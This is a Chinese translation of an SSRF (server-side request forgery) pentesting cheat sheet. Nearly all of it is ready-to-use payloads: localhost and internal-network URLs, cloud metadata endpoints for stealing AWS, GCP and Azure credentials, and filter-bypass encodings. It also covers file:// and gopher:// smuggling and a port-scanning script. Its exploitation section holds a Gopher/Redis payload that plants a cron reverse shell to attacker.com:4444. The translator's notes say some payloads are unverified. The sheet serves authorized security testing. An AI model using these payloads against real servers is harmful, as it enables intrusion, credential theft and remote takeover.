<a id="-ssrf---server-side-request-forgery"></a>
# 🌐 SSRF：服务端请求伪造

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
        服务端请求伪造        
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

<a id="-what-is-ssrf"></a>
## 🎯 什么是 SSRF

**SSRF（服务端请求伪造）**允许攻击者诱使服务器向非预期位置发起请求，从而可能访问内部服务或云元数据。

<a id="impact"></a>
### 影响
- 🔴 **访问内部网络** - 探测内部服务
- 🔴 **云元数据** - 窃取 AWS/GCP 凭据
- 🔴 **绕过防火墙** - 访问受保护资源
- 🔴 **RCE** - 某些情况下可导致代码执行

---

<a id="-where-to-look"></a>
## 🔍 从哪里寻找

<a id="common-parameters"></a>
### 常见参数
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

<a id="common-vulnerable-functions"></a>
### 常见易受影响的功能
```
- URL 获取／校验功能
- PDF 生成器
- 图像处理器
- 文件导入
- Webhook（事件回调）
- API 集成
- 网页抓取程序
- 网页截图服务
```

---

<a id="-basic-payloads"></a>
## 💉 基本载荷

<a id="localhost"></a>
### 本地主机（localhost）
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

<a id="internal-networks"></a>
### 内部网络
```
# A 类地址（原文分类标签，私有地址段见译注）
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# B 类地址（原文分类标签，私有地址段见译注）
http://172.16.0.1
http://172.31.255.255

# C 类地址（原文分类标签，私有地址段见译注）
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# 链路本地地址
http://169.254.169.254
```

<a id="common-ports"></a>
### 常见端口
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # 其他 HTTP 端口
http://127.0.0.1:9200  # Elasticsearch
```

---

<a id="-cloud-metadata"></a>
## ☁️ 云元数据

<a id="aws"></a>
### AWS
```
# 实例元数据（IMDSv1）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# 指定数据
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

<a id="google-cloud-gcp"></a>
### Google Cloud（GCP）
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# 需要携带请求头
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

<a id="azure"></a>
### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# 需要请求头
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

<a id="digitalocean"></a>
### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

<a id="-bypass-techniques"></a>
## 🛡️ 绕过技巧

<a id="ip-address-formats"></a>
### IP 地址表示形式
```
# 十进制
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# 十六进制
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# 八进制
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# 混合形式
http://127.1
http://127.0.1
http://0
```

<a id="url-encoding"></a>
### URL 编码
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# 双重编码
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

<a id="dns-rebinding"></a>
### DNS 重绑定
```
# 使用以下这类服务：
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# 配置自定义 DNS
your-domain.com → 127.0.0.1
```

<a id="url-parsing-issues"></a>
### URL 解析问题
```
# @ 技巧
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# 片段
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# 反斜杠
http://attacker.com\127.0.0.1
```

<a id="protocol-smuggling"></a>
### 协议走私
```
# 文件
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

<a id="open-redirect-chain"></a>
### 开放重定向链
```
# 站点存在开放重定向的情况：
https://target.com/redirect?url=http://169.254.169.254/

# 重定向至内部地址
http://target.com/redirect?url=http://127.0.0.1:8080
```

<a id="ipv6-bypass"></a>
### IPv6 绕过
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

<a id="header-injection"></a>
### 请求头注入
```
# URL 中的 CRLF 注入
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

<a id="-exploitation"></a>
## 🔥 漏洞利用

<a id="redis-rce-via-gopher"></a>
### 通过 Gopher 实现 Redis 远程代码执行（RCE）
```
# 生成载荷
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

<a id="http-request-smuggling"></a>
### HTTP 请求走私
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

<a id="port-scanning"></a>
### 端口扫描
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

<a id="-quick-reference"></a>
## 📊 速查

<a id="detection"></a>
### 检测
```
# 测试 SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# 检查响应
- 是否收到 DNS 查询？
- 是否收到 HTTP 请求？
- 对内部 IP 地址的响应是否不同？
```

<a id="impact-levels"></a>
### 影响等级

| 目标 | 影响 |
|--------|--------|
| 云元数据 | 严重：凭据窃取 |
| 内部 API | 高危：数据访问 |
| 内部服务 | 高危：可能导致 RCE |
| 端口扫描 | 中危：信息泄露 |

<a id="common-filters--bypasses"></a>
### 常见过滤规则与绕过方式

| 过滤规则 | 绕过方式 |
|--------|--------|
| 阻止 `localhost` | 使用 `127.0.0.1`, `0`, `[::1]` |
| 阻止 `127.0.0.1` | 使用十进制表示 `2130706433` |
| 阻止私有 IP 地址 | 使用 DNS 重绑定 |
| 仅允许 HTTP | 尝试 `gopher://`, `file://` |
| 域名白名单 | 使用 `@` 技巧或开放重定向 |

---

<a id="-tools"></a>
## 🛠️ 工具

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus（Gopher 载荷生成器）
python gopherus.py --exploit redis

# 用于 SSRF 盲测的 Collaborator／Webhook
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

<a id="-resources"></a>
## 📚 参考资料

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [SSRF 防御参考](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 SSRF 漏洞利用！</b><br>
  <i>仅用于已获授权的测试！</i>
</p>

> 译注：[RFC 1918](https://www.rfc-editor.org/rfc/rfc1918#section-3)规定的私有地址段按 CIDR 表示为 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16；原文的 A/B/C 分类仅作旧式标签。IP 变体、URL 编码、反斜杠及不同协议的效果取决于 URL 解析器与客户端支持；若已严格限制为 HTTP，改用 Gopher 或 file 并不会自动绕过限制。指向回环地址的静态 DNS 记录本身不等于 DNS 重绑定。

> 译注：云元数据访问仍受配置与身份权限限制。[AWS IMDS 文档](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)说明，强制 IMDSv2 的实例不接受本页所列的无令牌 IMDSv1 请求。[Azure 托管身份令牌接口](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)还要求 resource 参数和 Metadata 请求头；原文仅列出基础 URL，未给出完整令牌请求。

> 译注：本页保留了原始示例。HTTP URL 访问 443 端口不会自动切换为 HTTPS；列出的服务名只是常见端口用途。Gopher／Redis 片段包含换行和协议长度值，不能视为已验证的完整载荷；标为 HTTP 请求走私的示例也未独立证明前后端请求解析差异。端口探测脚本仅凭响应中缺少 connection refused 判断开放，可能误报，且未处理超时等异常。影响等级表为概括，实际等级取决于可达目标和获得的权限。
